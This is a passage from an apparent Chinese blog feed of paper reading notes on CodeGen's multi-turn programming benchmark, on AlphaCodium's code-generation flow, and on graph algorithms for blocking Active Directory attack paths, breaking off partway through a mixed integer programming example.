id="better-user-intent-understanding-yields-better-synthesized-programs">BETTER
USER INTENT UNDERSTANDING YIELDS BETTER SYNTHESIZED PROGRAMS</h2>
<p>将所有问题分为“通过”和“未通过”两类。</p>
<p>一个“通过”问题是指至少有一个来自 200
个样本的程序通过了所有的测试用例，</p>
<p>而一个“未通过”问题是指 200 个样本中没有任何一个通过所有测试用例。</p>
<p>计算了“通过”问题和“未通过”问题的平均提示困惑度，基于 CODEGEN-MONO
模型的样本进行分析。结果如表 2 所示。</p>
<figure>
<img
src="/images/Paper-An-Open-Large-Language-Model-for-Code-with-Multi-Turn-Program-Synthesis/image-20241230155312014.png"
alt="Table 2: Average prompt perplexity↓ (± standard error) of CODEGEN-MONO models on pass and non-pass problems." />
<figcaption aria-hidden="true">Table 2: Average prompt perplexity↓ (±
standard error) of CODEGEN-MONO models on pass and non-pass
problems.</figcaption>
</figure>
<p>可以看到，“通过”问题的提示困惑度低于“未通过”问题的提示困惑度。这一发现表明，当模型更好地理解用户意图规格时，代码生成更有可能成功。</p>
<p>事实上，一些训练数据包含了交替出现的自然语言注释和程序，其中注释描述了后续程序的功能。</p>
<p>因此，本文推测，与这种模式相似的用户意图规格更容易被模型理解，从而促成更好的代码生成。受到这一模式的启发，本文提出将用户意图分为多轮提示，使模型每次集中处理部分问题，从而使模型更容易理解用户意图。</p>
<h1 id="multi-turn-evaluation">MULTI-TURN EVALUATION</h1>
<p>在这一部分，本文提出并研究了一种多步骤代码生成范式，其中代码生成被分解为多个步骤，系统在每个步骤合成一个子程序。</p>
<p>为了验证这一范式，本文首先开发了一个多轮编程基准（MTPB）。</p>
<p>MTPB 包含 115
个由专家编写的问题，每个问题都包括多步骤的自然语言描述（提示）。</p>
<p>为了解决一个问题，模型需要合成功能正确的子程序：</p>
<ol type="1">
<li>根据当前步骤的描述合成子程序；</li>
<li>考虑到前一步骤的描述和已合成的子程序（例如，正确地回溯引用前一步骤中定义的函数和/或变量）。</li>
</ol>
<p>图 1 中给出了一个示例。</p>
<h2 id="benchmark-construction">BENCHMARK CONSTRUCTION</h2>
<p>本文首先定义了 115
个问题，这些问题需要广泛的编程知识，包括数学、数组操作、字符串处理、算法、数据科学以及其他需要知识的问题，确保每个类别的问题数量大致平衡。</p>
<p>对于每个问题，本文构建了一个三元组，包含多轮提示 P、测试用例输入 I
和测试用例输出 O。</p>
<p>多轮提示 P 设计遵循两个约束条件：</p>
<p>（1）问题被分解为 3 个或更多步骤，</p>
<p>（2）单轮提示不能完成整个问题的解答。</p>
<p>例如，实施线性回归模型可以表达为“对 x 和 y 进行线性回归”。</p>
<p>由于主要任务在此提示中已完全表达，理解该提示足以执行任务。本文通过人工检查避免了这种情况，并将问题解决过程分布到多个步骤中。</p>
<p>与提示一起，本文要求问题的作者准备 5 组测试用例输入 I 和输出
O，以评估模型输出的功能正确性。</p>
<p>为了避免错误奖励那些通过测试但给出无意义程序的错误正例，本文审查并修订这些案例，以确保测试质量。</p>
<p>与 HumanEval 中期望模型完成部分定义函数的方式不同，MTPB
问题仅提供提示，因此模型必须从头生成解决方案。</p>
<p>虽然自由格式的生成可能允许更多潜在的解决方案，但缺乏提供测试用例输入的入口使得测试生成的代码在多样化测试用例中的表现更加困难。</p>
<p>为了解决这一挑战，我们在提示中嵌入了测试用例输入。</p>
<p>具体来说，提示使用 Python
的格式化字符串书写，在应用特定的测试用例时，输入值会替代变量名。</p>
<p>例如，一个 prompt 如下：</p>
<blockquote>
<p>定义一个名为 ‘s’ 的字符串，值为 {var}。</p>
</blockquote>
<p>当测试用例输入为 <code>var = 'Hello'</code> 时，格式化为</p>
<blockquote>
<p>定义一个名为 ‘s’ 的字符串，值为 'Hello'。</p>
</blockquote>
<p>图 1 中也给出了一个例子。</p>
<h2 id="execution-environment-and-solution-evaluation">EXECUTION
ENVIRONMENT AND SOLUTION EVALUATION</h2>
<p>在执行过程中，提示和生成的完成对的历史记录会被连接成一个自包含的程序（见图
1 中的 3）。</p>
<p>然后，该程序将在隔离的 Python 环境中执行，遵循单轮 HumanEval
基准（Chen et al., 2021）。</p>
<p>HumanEval
中的问题是通过完成已知的函数签名来构建的，因此在一组功能单元测试下调用生成的代码是简单的。</p>
<p>MULTI-TURN EVALUATION
中不保证会生成这样的入口点（或返回值），因此最后一个提示总是指定打印出结果状态到终端。</p>
<p>然后，基准执行环境会重载 Python 的 <code>print(args)</code> 函数并将
<code>args</code> 存储在堆栈中。</p>
<p>如果问题的最后一个提示生成的代码不包含 <code>print()</code>
语句（这是在 Python 或特定的 Jupyter notebooks
中打印到终端的有效约定），则会修改生成代码的 AST，注入
<code>print()</code> 的调用。</p>
<h2
id="multi-step-programming-capacity-scales-with-model-size-and-data-size">MULTI-STEP
PROGRAMMING CAPACITY SCALES WITH MODEL SIZE AND DATA SIZE</h2>
<p>研究了模型规模和数据规模如何影响多轮范式下的代码生成能力。</p>
<p>MTPB 上的表现随着模型规模和数据规模的增加而提高。</p>
<p>这表明，多步骤代码生成能力随着模型规模和数据规模的增加而提升。</p>
<p>模型仅通过自回归语言建模目标进行训练。</p>
<p>在模型和数据规模扩大时，多轮代码生成能力应运而生，也就是在多轮方式下代码生成能力。</p>
<h2
id="better-user-specification-understanding-with-multi-turn-factorization">BETTER
USER SPECIFICATION UNDERSTANDING WITH MULTI-TURN FACTORIZATION</h2>
<p>本文假设多轮分解可以增强模型对用户意图规格的理解，从而提高代码生成能力。</p>
<p>为了验证这一假设，本文通过将每个多轮规格合并成一个单轮规格，形成一个单轮版本的对照组。</p>
<p>实验结果表明，对于所有模型，单轮规格的平均困惑度高于多轮规格。</p>
<p>较大模型下的多轮和单轮意图规格的平均困惑度略低于较小模型下的困惑度，表明较大的模型比较小的模型更能理解用户意图。</p>
<p>这与本文最初的假设一致，即将复杂的规格分解能够简化问题理解并提升代码生成能力。</p>
<h2 id="qualitative-examples">QUALITATIVE EXAMPLES</h2>
<p>总体而言，较大规模的模型克服了较小模型由于误解提示而产生的错误。</p>
<h1 id="conclusion">CONCLUSION</h1>
<p>本文研究了基于大规模代码数据语料库训练的大型因果语言模型在代码生成中的应用。</p>
<p>随着模型规模和数据规模的增加，理解长上下文并生成连贯响应的能力从简单的语言建模中自然涌现。</p>
<p>利用这一能力，并且观察到更好的用户意图理解能够带来更优的代码生成，本文提出了一种多步骤的代码生成方法，其中代码生成通过多轮的意图说明和代码生成实现。</p>
<p>此外，本文开发了多轮编程基准（MTPB），以研究本文的模型在这种多步骤范式下代码生成能力。</p>
<p>本文的实验表明，多步骤代码生成的能力随着模型规模和数据规模的增加而提升。</p>
<p>多步骤指定的意图说明能够更容易地被模型消化，从而带来更准确的代码生成。</p>
<p>为了促进未来在这一领域的研究和实际应用，本文将训练代码和模型检查点开源。</p>
]]></content>
      <categories>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>Paper</tag>
      </tags>
  </entry>
  <entry>
    <title>论文 Code Generation with AlphaCodium： From Prompt Engineering to Flow Engineering</title>
    <url>/Paper-Code-Generation-with-AlphaCodium/</url>
    <content><![CDATA[<p>说是很火，读一下，GitHub 3k star 了。</p>
<p>在自然语言生成中的优化技巧可能并不适用于代码生成任务。</p>
<p>本文提出了名为 AlphaCodium 的代码生成方法，在 CodeContests
上的准确率从 19% 提升到了 44%。</p>
<span id="more"></span>
<h1 id="introduction">Introduction</h1>
<p>对于同一需求，可以解决问题的代码是丰富多样的。</p>
<p>CodeContests 测试集是从 Codeforces
等竞赛编程平台精心整理而来，一个需求包含超 200 种解法。</p>
<p>DeepMind 开发的代码生成系统
AlphaCode，利用了一个专门针对竞赛编程任务微调的网络，它生成了非常多的解决方案（最多可达100万），然后对这些方案进行处理和聚类，并从中选择少数（约10个）提交。尽管
AlphaCode
的结果令人印象深刻，但需要专门为<strong>代码导向任务进行微调模型</strong>，以及<strong>高计算量</strong>的支持，使这个方法并不实用。</p>
<p>CodeChain
是另一项针对竞赛编程任务的工作，它通过一系列基于子模块的<strong>自我修订</strong>来改善大语言模型的代码生成能力。</p>
<p>而本文提出的
AlphaCodium，是一种围绕迭代过程的面向代码的流程。在该流程中，反复运行并修正生成的代码以通过输入输出测试。</p>
<p>AlphaCodium 流程的两个关键要素是：</p>
<ul>
<li><p>生成额外的数据，如问题反思和测试推理，以帮助迭代过程；</p></li>
<li><p>通过 AI 生成额外的测试用例来丰富公共测试集。提出的流程如图 1
所示，分为两个主要阶段：一个是自然语言推理问题的预处理阶段，另一个是生成、运行并修正代码解决方案以通过已有测试集和
AI 生成测试集的迭代生成阶段。</p></li>
</ul>
<figure>
<img
src="/images/Paper-Code-Generation-with-AlphaCodium/image-20240823153838484.png"
alt="Figure 1: (a) The proposed AlphaCodium flow." />
<figcaption aria-hidden="true">Figure 1: (a) The proposed AlphaCodium
flow.</figcaption>
</figure>
<p>在设计 AlphaCodium
时，本文发现<strong>生成额外的有用测试用例</strong>比生成正确的代码解决方案更容易。</p>
<p>添加特定测试主要需要理解问题、一些洞察力和基本的蛮力或逻辑推理能力。而在生成额外测试用例时并不需要完全“解决”问题。</p>
<p>AlphaCodium
还利用了一些新颖的面向代码的设计概念、技巧和最佳实践，例如：</p>
<ul>
<li>YAML 结构化输出</li>
<li>符号分析进行语义推理</li>
<li>生成模块化代码</li>
<li>双重验证的软决策</li>
<li>鼓励探索并放缓决策</li>
<li>测试锚点</li>
</ul>
<p>与精心设计的单一 prompt 相比，AlphaCodium 在 CodeContests
问题上始终显著地提高了大语言模型的性能。</p>
<h1 id="codecontests-dataset">CodeContests Dataset</h1>
<p>废话，说明为什么选 CodeContests。</p>
<h1 id="the-proposed-flow">The Proposed Flow</h1>
<h2 id="问题反思">问题反思</h2>
<p>描述问题时，列出要点，涵盖问题目标、输入、输出、规则、约束和问题描述中出现的其他相关细节。</p>
<h3 id="公共测试推理">公共测试推理</h3>
<p>解释每个测试输入如何导致相应的输出。</p>
<h3 id="生成可能的解决方案">生成可能的解决方案</h3>
<p>生成 2-3 个可能的解决方案列表，用自然语言描述每个解决方案。</p>
<h3 id="排序解决方案">排序解决方案</h3>
<p>对可能的解决方案进行排序，并选择“最佳解决方案”，考虑正确性、简单性和鲁棒性（不一定选择“最有效”的解决方案）。</p>
<h3 id="生成额外的-ai-测试">生成额外的 AI 测试</h3>
<p>为问题生成 68
个多样化的输入输出测试，尽量覆盖原始公共测试未涵盖的情况和方面。</p>
<h3 id="初始代码解决方案">初始代码解决方案</h3>
<p>目标是生成一个初步的代码解决方案，使其尽可能接近正确代码，以便在下一阶段的运行修复迭代中更容易成功。阶段流程如下：</p>
<ul>
<li>选择一个潜在的解决方案。生成相应的代码，并在选定的公共和 AI
测试上运行它。</li>
<li>重复此过程，直到测试通过或达到尝试限制。</li>
<li>第一个通过测试的代码，或输出最接近的代码（见附录
D），将用作下一步的基础代码。</li>
</ul>
<h3 id="在公共测试上迭代">在公共测试上迭代</h3>
<p>从基础代码开始，迭代地在公共测试上运行代码。如果代码在特定测试中失败，根据错误信息尝试修复。</p>
<h3 id="在-ai-生成的测试上迭代">在 AI 生成的测试上迭代</h3>
<p>在 AI 生成的测试上继续进行运行修复迭代。使用“测试锚点”（见第 4
节）。</p>
<h2 id="additional-insights">Additional insights</h2>
<p>AlphaCodium
流程依赖于知识积累，从简单到困难逐步推进，在此过程中逐步获得知识和洞察力，以帮助应对更困难的阶段。</p>
<p>例如，第一个步骤的问题反思的输出可以作为更困难步骤（如生成可能的解决方案）的提示输入。预处理阶段的输出用于帮助最具挑战性和关键的阶段，即代码迭代阶段，本文在此阶段尝试生成正确解决问题的代码。</p>
<p>此外，在设计 AlphaCodium 时，对于 AI
来说，生成更多测试比生成完整的解决方案代码更容易。生成额外的测试主要需要理解问题和基本的暴力破解或逻辑推理。无需完全“解决”问题即可生成额外的有用输入输出测试对。这与生成正确的解决方案代码形成对比，后者需要一个完整的算法解决方案，相当于正确解决所有可能的输入输出测试对。因此可以生成更多的
AI 测试，然后利用这些测试来改进代码创建阶段，如图 1(b)
所示。本文进一步通过要求模型关注原始公共测试未涉及的方面（如大输入、边界情况等）来增强这些额外测试的贡献。</p>
<p>此外，注意到一些步骤可以合并为单次 LLM 调用，并且图 2(a)
中的流程是一个概念流程，强调了过程的高层步骤。在实际应用中，结构化输出（见第
4 节）使得可以将多个阶段合并为单次 LLM
调用，以节省资源，或因为模型在同时处理特定任务时表现更好。</p>
<h1 id="code-oriented-design-concepts">Code-Oriented Design
Concepts</h1>
<h2 id="yaml-structured-output">YAML Structured output</h2>
<p>要求模型生成等效于给定 Pydantic 类的 YAML 格式输出是关键的一部。</p>
<h2 id="semantic-reasoning-via-bullet-points-analysis">Semantic
reasoning via bullet points analysis</h2>
<p>当要求 LLM
理解一个问题时，要求输出以项目符号格式【一般描述、目标和规则、输入结构和输出结构】呈现通常会获得更好的结果，如图
2。</p>
<p>生成一个单一冗长的函数时，代码通常包含错误或逻辑错误。</p>
<p>单一的整体代码会影响迭代修复的能力。</p>
<p>当明确要求模型将生成的代码划分为小的子函数，具有有意义的名称和功能时，生成的代码更好，错误更少，迭代修复阶段的成功率更高。</p>
<figure>
<img
src="/images/Paper-Code-Generation-with-AlphaCodium/image-20240823163152900.png"
alt="Figure 2: (b) An AI-generated self-reflection on the problem." />
<figcaption aria-hidden="true">Figure 2: (b) An AI-generated
self-reflection on the problem.</figcaption>
</figure>
<h2 id="llms-do-better-when-generating-a-modular-code">LLMs do better
when generating a modular code</h2>
<p>LLM
在需要思考、推理和做出严格非平凡决策的代码任务中往往表现不佳。</p>
<p>本文添加了一个额外步骤：给定生成的输出，模型被要求重新生成相同的输出，但如果需要则进行修正。</p>
<p>比直接问“这个测试是否正确？”的问题更有效。</p>
<h2 id="soft-decisions-with-double-validation">Soft decisions with
double validation</h2>
<p>直接问复杂的问题时，容易看到幻觉和错误答案。</p>
<p>因此采用了逐步数据积累的流程，从简单任务到复杂任务：</p>
<ul>
<li>从最简单的任务开始，对问题进行自我反思，并推理公共测试。</li>
<li>继续生成额外的 AI 测试和可能的解决方案。</li>
<li>只有在获得模型对上述任务的回答后，才进行实际的代码生成和运行修复迭代。</li>
</ul>
<h2 id="test-anchors">Test anchors</h2>
<p>当测试失败时，如何判断是因为代码错误还是因为测试本身错误？</p>
<p>测试锚点技术：</p>
<ul>
<li><strong>首先在公共测试上进行迭代</strong>：这些测试必然是正确的。完成后，将所有通过的测试设置为锚点测试。</li>
<li><strong>然后逐个在 AI
生成的测试上进行迭代</strong>：如果一个测试通过，将其添加到测试锚点列表中。</li>
<li><strong>如果一个测试失败，假设是因为代码不正确，并尝试修复代码</strong>。但要求修复后的代码也必须通过所有已获取的测试锚点。因此，测试锚点免受错误修复代码的影响。</li>
</ul>
<h1 id="results">Results</h1>
<p>结论感觉没啥好看的但蛮记录一下。</p>
<h2 id="direct-prompt-vs.-alphacodium-flow">Direct prompt vs.
AlphaCodium flow</h2>
<p>定义指标为 pass@k，定义为每个问题生成 k
个解决方案后成功解决问题的百分比。</p>
<p>对于 GPT-4 的验证集，pass@5 得分从 19% 提升到 44%，提高了 2.3
倍。</p>
<h2 id="comparison-to-previous-works">Comparison to previous works</h2>
<p>当与 CodeChain
使用相同模型（GPT-3.5）和相同指标（pass@5）进行比较时，AlphaCodium
的表现始终更优。</p>
<p>算了懒得记了反正就是说他好，差的也不会拿来比。</p>
<h1 id="conclusions">Conclusions</h1>
<p>总结一下，本文提出的流程分为两个主要阶段：</p>
<ol type="1">
<li><strong>预处理阶段</strong>：AlphaCodium 以自然语言推理问题。</li>
<li><strong>代码迭代阶段</strong>：AlphaCodium 在公共测试和 AI
生成的测试上进行迭代。</li>
</ol>
<p>还采用了额外的设计理念、技巧和最佳实践，这些对代码生成非常有帮助，包括：</p>
<ol type="1">
<li>使用 YAML 格式生成结构化输出。</li>
<li>生成模块化代码。</li>
<li>通过要点分析进行语义推理（semantic reasoning via bullet point
analysis）。</li>
<li>采用双重验证的柔性决策（soft decisions with double
validation）。</li>
<li>鼓励探索（encouraging exploration）。</li>
<li>测试锚点（test anchors）。</li>
</ol>
]]></content>
      <categories>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>Paper</tag>
      </tags>
  </entry>
  <entry>
    <title>论文 Scalable Edge Blocking Algorithms for Defending Active Directory Style Attack Graphs</title>
    <url>/Paper-Scalable-Edge-Blocking-Algorithms-for-Defending-Active-Directory-Style-Attack-Graphs/</url>
    <content><![CDATA[<p>阅读笔记，<strong>2023 AAAI</strong>。</p>
<h1 id="摘要">摘要</h1>
<p><strong>AD</strong>（活动目录, <strong>Active
Directory</strong>）可以看做是一个攻击图，其中节点代表计算机/账户/安全组，边代表现有访问权限/已知漏洞，这些访问权限/漏洞允许攻击方从一个节点访问另一个节点。</p>
<p>与许多仅具有理论性质的攻击图模型不同，<strong>AD</strong>
攻击图正在被实际攻击者和 <strong>IT</strong>
管理员积极使用。已开发了多个软件工具（包括开源和商业软件），用于扫描、可视化和分析
<strong>AD</strong> 图。</p>
<blockquote>
<p>比如
<strong>BLOODHOUND</strong>，模拟了身份雪球攻击。攻击者从一个低权限帐户开始，这被称为攻击者的入口节点（例如，通过钓鱼邮件获得）。然后，攻击者从一个节点移动到另一个节点，最终目标是获取名为
<strong>DA</strong>（域管理员，<strong>Domain
Admin</strong>）的最高权限帐户。</p>
</blockquote>
<span id="more"></span>
<h1 id="研究目的">研究目的</h1>
<p>如何通过付出最小的代价来阻断攻击线路，降低攻击者获取
<strong>DA</strong> 权限的成功率。</p>
<blockquote>
<p>如果一个 <strong>IT</strong> 管理员需要 <strong>1</strong> 小时来阻断
<strong>1</strong> 条线路（包括审计、报告、实施），并且一天有
<strong>8</strong> 小时工作时间，那么代价 <strong>b = 8</strong>。</p>
<p>且一些线路是企业正常运营所必须的，阻断的代价相当昂贵。</p>
</blockquote>
<p>在本文的模型中，假设不同的线路具有不同的攻击失败率，而阻断攻击线路即是将攻击失败率提升至
<strong>100%</strong>。</p>
<p>本文的重点不在于推进固定参数分析（<strong>fixed-parameter
analysis</strong>）的理论前沿，这只是在 <strong>AD</strong>
图上设计可扩展算法的手段。</p>
<p>实际上，本文的研究方法结合了固定参数分析和实际优化技术（<strong>practical
optimisation techniques</strong>）。</p>
<h1 id="ad-图的结构特征">AD 图的结构特征</h1>
<p>观察到实际 <strong>AD</strong> 图有两个明显的结构特征。</p>
<ol type="1">
<li><p>攻击路径倾向于很短</p>
<blockquote>
<p>这是一种尚未经证实的观察，但本文认为在实际应用中这是合理的。</p>
<p>并不是说长路径不存在，指攻击方实际使用的最短路径。</p>
<p><strong>BLOODHOUND</strong>
团队类比了著名的“六度分隔”理念，即，这个世界上的所有人平均通过六步或更少的社交连接就能相互联系。在域中也一样，在一个组织中，从一个实习生的账户到
<strong>CEO</strong> 的账户通常只需要几步。</p>
</blockquote></li>
<li><p><strong>AD</strong> 图与树非常相似</p>
<blockquote>
<p>人力资源部门可能构成一个树枝，而市场营销部门则形成另一个树枝。</p>
<p>但不完全对，因为人力资源部门的一个账户可能有合理的理由访问属于市场营销部门的计算机上的数据。</p>
<p>可以将活动目录攻击图解释为带有额外非树边的树，这些非树边代表安全例外。</p>
</blockquote></li>
</ol>
<h1 id="工作内容">工作内容</h1>
<ol type="1">
<li>为纯策略和混合策略的最优边缘阻塞设计实际可扩展的算法。</li>
</ol>
<blockquote>
<p>对于内网中拥有数千台计算机的组织，<strong>AD</strong>
图通常涉及数万个节点。本文通过利用 <strong>AD</strong>
图的结构特征，成功地扩展到这样的规模。</p>
</blockquote>
<ol start="2" type="1">
<li>证明仅有短攻击路径不足以推导出高效的阻断策略。</li>
</ol>
<blockquote>
<p>即使最大攻击路径长度是一个常数，纯策略和混合策略阻断都是
<strong>NP</strong> 难的。</p>
</blockquote>
<ol start="3" type="1">
<li>探索 <strong>AD</strong> 图的树状特征。</li>
</ol>
<h2 id="策略设计">策略设计</h2>
<h3 id="纯策略pure-strategy">纯策略(pure strategy)</h3>
<p>毫不犹豫地阻断 <span class="math inline">\(b\)</span> 个线路。</p>
<p>采用 <strong>Stackelberg</strong>
博弈模型，假设攻击者可以观察到防御者的策略并采取最佳反应。</p>
<blockquote>
<p><strong>Stackelberg</strong>
博弈模型，在这个模型中，通常有两家公司：一家是“领导者”，另一家是“追随者”。领导者公司首先采取行动，然后追随者公司在观察了领导者的决定后作出决策。</p>
</blockquote>
<p>可以简化为单源单目的地最短路径边界阻断问题。</p>
<blockquote>
<p>这被认为是 <strong>NP</strong> 难的，但是在一般图上的
<strong>NP</strong> 难并不意味着 <strong>AD</strong>
图上无法找到高效算法。</p>
<p>参数计算方法通常将一个优化问题(以最小值问题为例)转化为参数化问题“判定问题是否存在一个大小至多为参数
<strong>k</strong> 的解”。</p>
<p>一个参数化问题如果可以在时间 <span
class="math inline">\(O(f(k)n^{O(1)})\)</span> 内求解，其中 <span
class="math inline">\(f(k)\)</span> 是一个关于参数 <strong>k</strong>
的单调非减函数，<strong>n</strong>
为实例的规模，则该问题称为固定参数可解的 <strong>(Fixed-Parameter
Tractable)</strong>，习惯上用 <strong>FPT</strong>
表示该类问题的集合，相应的算法称为固定参数可解算法。</p>
</blockquote>
<h3 id="混合策略mixed-strategy">混合策略(mixed strategy)</h3>
<p>注明了多组 <span class="math inline">\(b\)</span>
个线路组合和选择对应组合的概率。</p>
<p>攻击者只能观察到选择阻断组合的概率，而不能观察到实际的选择情况。</p>
<h2 id="方法设计">方法设计</h2>
<h3 id="方法一">方法一</h3>
<p>针对纯策略的阻塞。</p>
<p>对于<a
href="https://joeylian.github.io/2020/06/29/2020-06-30-%E5%9B%BE%E7%9A%84%E6%A0%91%E5%88%86%E8%A7%A3/">数宽</a>较小的，本文使用了一个基于树分解的动态规划方法，然后将其转化为强化学习环境。</p>
<blockquote>
<h2 id="树分解-tree-decomposition">树分解 Tree decomposition</h2>
<p>图的树分解是为了<strong>简单无向图</strong>尽可能地分解为树形结构，通过研究树上的结构信息来刻画原图的一些性质。</p>
<p>在实际应用中，很多问题涉及的图的规模都很大，直接求解的难度也很高。<strong>若将这类问题的图转化为树，则可在多项式时间甚至线性时间内求解问题</strong>。</p>
<p>图的树分解是对图 <span class="math inline">\(G\)</span>
的结点集进行划分，生成与之对应的一棵分解树 <span
class="math inline">\(T\)</span>，<span class="math inline">\(T\)</span>
中的节点 <span class="math inline">\(i\)</span> 对应 <span
class="math inline">\(G\)</span> 的一个结点子集 <span
class="math inline">\(X_i\)</span>。</p>
<p>对于<strong>简单无向图</strong> <span
class="math inline">\(G=(V,E)\)</span>，其树分解是 <span
class="math inline">\(T_G=(X,T)\)</span>，其中 <span
class="math inline">\(T=(I,F)\)</span> 是一颗有根树，<span
class="math inline">\(I\)</span> 为其点集，也称作包，<span
class="math inline">\(F\)</span> 为其边集。</p>
<p><span class="math inline">\(X=\{X_i:i \in I\}\)</span> 是一个 <span
class="math inline">\(V\)</span> 的子集族。其满足以下条件：</p>
<ol type="1">
<li><span class="math inline">\(\underset{i \in
I}{\cup}X_i=V\)</span>，即所有的子集族并集等于 <span
class="math inline">\(G\)</span> 的结点集。</li>
<li>对于 <span class="math inline">\(\forall (u,v) \in E,\exists \, i
\in I\)</span>， 存在 <span class="math inline">\(u,v \in
X_i\)</span>，即 <span class="math inline">\(G\)</span>
中每条边的两个节点必存在于某个子集中。</li>
<li>对于 <span class="math inline">\(i,j,k \in I\)</span>， 如果 <span
class="math inline">\(T\)</span> 中 <span
class="math inline">\(k\)</span> 出现在 <span
class="math inline">\(i\)</span> 到 <span
class="math inline">\(j\)</span> 到一条路径上，则有 <span
class="math inline">\(X_i \cap X_j=X_k\)</span>。</li>
</ol>
<h3 id="示例">示例</h3>
<p><img
src="/images/Paper-Scalable-Edge-Blocking-Algorithms-for-Defending-Active-Directory-Style-Attack-Graphs/image-20240215204550057.png" /></p>
<h4 id="消序">消序</h4>
<p>上图使用最小度、最小填边数优先排序的贪心算法产生一个消点序。</p>
<ol type="1">
<li><p>遍历最小度，生成一个结点集 <span
class="math inline">\(MV_i\)</span>。</p></li>
<li><p>遍历 <span class="math inline">\(MV_i\)</span>，选择一个节点
<span class="math inline">\(v\)</span>，要求其邻域 <span
class="math inline">\(N(v)\)</span>
中任意两点<strong>未相连的边数量最少</strong>。</p></li>
<li><p>然后删除节点 <span class="math inline">\(v\)</span>
和与其相邻的边，并将 <span class="math inline">\(N(v)\)</span>
中未相连的边集 <span class="math inline">\(F_i\)</span>
也加入。</p></li>
<li><p>最后根据删除的节点 <span
class="math inline">\(v\)</span>，生成一个消点序 <span
class="math inline">\(V=\{\pi^{-1}(1),...,\pi^{-1}(n)\}\)</span>【<span
class="math inline">\(\pi\)</span> 为点和次序的双射排列】。 <span
class="math display">\[
\pi=\begin{pmatrix} a &amp; b &amp; c &amp; d &amp; e &amp; f &amp; g
&amp; h \\ ６ &amp; ７ &amp; １ &amp; ４ &amp; ５ &amp; ８ &amp; ２
&amp; ３ \end{pmatrix}
\]</span></p></li>
<li><p>合并 <span class="math inline">\(F\)</span> 到 <span
class="math inline">\(E\)</span>，就可以得到图 <span
class="math inline">\(G\)</span> 的三角剖分。【大概是多了 <span
class="math inline">\(G_5\)</span> 的那条虚线边吧，大概】</p></li>
</ol>
<h4 id="生成包序列">生成包序列</h4>
<p><span class="math display">\[X_1=N_G[v_1]=N_G(v_1) \cup
\{v_1\}\]</span> <span class="math display">\[X_2=N_{G_{[e(v_1)]}}(v_2)
\cup \{v_2\}\]</span> <span class="math display">\[...\]</span> <span
class="math display">\[X_k=N_{G_{[e(v_1,...,v_{k-1})]}}(v_k) \cup
\{v_k\}\]</span> <span class="math display">\[...\]</span> <span
class="math display">\[X_n=\{v_n\}\]</span></p>
<p><span class="math inline">\(G_{[e(v_1,...,v_{k-1})]}\)</span>
表示依次从 <span class="math inline">\(G\)</span> 中删去 <span
class="math inline">\(V_i\)</span> 产生的图，然后得到下面这玩意。 <span
class="math inline">\(X_8=\{f\},X_7=\{b,f\},X_6=\{a,b,f\},X_5=\{e,a,f\},X_4=\{d,a,e\},X_3=\{h,e\},X_2=\{g,e,h\},X_1=\{c,b\}\)</span>。</p>
<h4 id="合并部分节点包">合并部分节点包</h4>
<p><span class="math display">\[X_8 \subset X_7 \subset X_6 = \{a,b,f\},
8 = max\{6,7,8\}\]</span> <span class="math display">\[X_3 \subset X_2 =
\{g,e,h\}, 3 = max\{2,3\}\]</span> <span class="math display">\[X_5 =
\{e,a,f\}, X_4 = \{d,a,e\}, X_1 = \{c,b\}\]</span> <span
class="math display">\[I=\{1,3,4,5,8\}\]</span></p>
<h4 id="最后得到分解树">最后得到分解树</h4>
<h2 id="树宽度">树宽度</h2>
<p>引入树宽的概念是为了反映给定的图形结构与分解后的树形结构的相似程度。</p>
<p>较小的树宽表示该图接近于一棵树。</p>
<p>图本身是树时，树宽为 <span class="math inline">\(1\)</span>。</p>
<p>宽度为所有片段 <span class="math inline">\(X\)</span>
的大小的最大值减 <span class="math inline">\(1\)</span>，<span
class="math inline">\(max(|X_i|-1)\)</span>。</p>
<h2 id="k-tree">K-Tree</h2>
<p><strong>K-Tree</strong> 是往一个 <strong>K+1</strong>
顶点的完全图里加顶点，使得每个新加的顶点 <strong>v</strong> 都有
<strong>K</strong> 个邻居 <strong>U</strong>，这样，<strong>v</strong>
和 <strong>U</strong> 合起来共计 <strong>K+1</strong> 个顶点构成一个
<strong>Clique</strong>。</p>
<p>如下图，<strong>K=3</strong>，即初始为 <strong>4</strong>
顶点完全图。</p>
<p><img
src="/images/Paper-Scalable-Edge-Blocking-Algorithms-for-Defending-Active-Directory-Style-Attack-Graphs/2880px-Goldner-Harary_graph.svg.png" /></p>
<p><strong>Treewidth</strong> 为 <strong>K</strong> 的图是
<strong>K-Tree</strong> 的子图，因此被称为 <strong>A partial
K-Tree</strong>。</p>
</blockquote>
<p>这使得 <strong>Anytime Algorithm</strong>
具有更好的拓展性，但是无法保证最优。</p>
<blockquote>
<p>任意时间算法（<strong>Anytime
Algorithm</strong>）更多的是一种算法设计的概念或思想，而不是一个具体的、固定的算法框架。这种算法的核心特点是能够在任何时候停止执行，并提供当前已得到的最佳解决方案。这对于时间敏感或计算资源受限的应用场景特别重要。</p>
</blockquote>
<h3 id="方法二">方法二</h3>
<p>处理纯策略和混合策略的阻塞。</p>
<p>为了应对 <strong>AD</strong>
图上的特定应用，提出了一种非标准的固定参数。</p>
<blockquote>
<p>常规的攻击路径描述了一条权限提升路径。</p>
<p>一个节点拥有多个权限提升出边是罕见的【因为这样的边通常代表安全例外或配置错误】。</p>
</blockquote>
<p>本文观察到实际的AD图包含非分割路径【本文提出的特征：每个节点都有一条出边的路径】，对于非分裂路径数量较少的图，本文提出了核化技术来缩小模型规模，然后通过混合整数规划求解。</p>
<blockquote>
<h2 id="混合整数规划求解">混合整数规划求解</h2>
<table>
<thead>
<tr class="header">
<th>Food</th>
<th>Cost per serving</th>
<th>Vitamin A</th>
<th>Calories</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Corn</td>
<td>0.18</td>
<td>107</td>
<td>72</td>
</tr>
<tr class="even">
<td>2% Milk</td>
<td>0.23</td>
<td>500</td>
<td>121</td>
</tr>
<tr class="odd">
<td>Wheat Bread</td>
<td>0.05</td>
<td>0</td>
<td>65</td>
</tr>
</tbody>
</table>
<p>超市里头有卖 <strong>3</strong>
种食品，玉米，牛奶和面包，价格，所含的维他命 <strong>A</strong>
和卡路里的信息见上表。现在的问题是买多少份的玉米，牛奶，面包，使得总价格最低，而维他命
<strong>A</strong> 的总摄取量不小于 <strong>500</strong> 但不大于
<strong>50000</strong>，卡路里的总摄取量不小于 <strong>2000</strong>
但不大于 <strong>2250</strong>。这个问题的数学描述如下：</p>
<p><span class="math display">\[min:
